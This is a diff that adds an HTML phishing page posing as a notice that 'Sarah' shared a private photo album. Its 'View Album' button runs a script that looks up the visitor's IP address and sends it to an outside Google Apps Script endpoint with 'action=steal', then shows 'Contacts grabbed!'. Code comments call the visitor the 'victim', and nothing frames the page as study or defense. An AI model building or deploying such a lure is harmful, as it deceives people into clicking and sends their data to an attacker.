@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Sarah shared photos</title>
+<meta name="viewport" content="width=device-width">
+<style>
+body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;font-family:system-ui;padding:40px;text-align:center;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
+h1{font-size:32px;margin-bottom:20px}
+p{font-size:18px;margin-bottom:40px;max-width:350px}
+.btn{background:#4285f4;color:white;padding:20px 50px;border-radius:30px;font-size:20px;text-decoration:none;display:inline-block;box-shadow:0 10px 30px rgba(66,133,244,.4)}
+.photos{display:grid;grid-template-columns:repeat(3,1fr);gap:15px;max-width:300px;margin:30px 0}
+.photo{background:hsla(0,0%,100%,.15);height:100px;border-radius:20px}
+</style>
+</head>
+<body>
+<h1>🎉 Sarah shared photos!</h1>
+<p>Sarah added you to private album (47 photos)</p>
+<div class="photos">
+<div class="photo"></div><div class="photo"></div><div class="photo"></div>
+<div class="photo"></div><div class="photo"></div><div class="photo"></div>
+</div>
+<a id="phishBtn" href="#" class="btn">🔓 View Album</a>
+
+<script>
+document.getElementById('phishBtn').onclick = async ()=>{
+  const btn = document.getElementById('phishBtn');
+  btn.innerText = 'Loading...';
+  
+  // Get victim IP
+  const ip = await (await fetch('https://api.ipify.org?format=json')).json().then(r=>r.ip);
+  
+  // Call Apps Script
+  fetch('**https://script.google.com/macros/s/AKfycbw_vRQe_TSJWxJPqoWoSejHBpm-drL8IdNtWCh6kpES3umxSQC4sVIPBXJ-vyKun4vK/exec**?ip='+ip+'&action=steal')
+    .then(()=>btn.innerText='Contacts grabbed!')
+    .catch(()=>btn.innerText='Error - retry');
+};
+</script>
+</body>
+  </html>
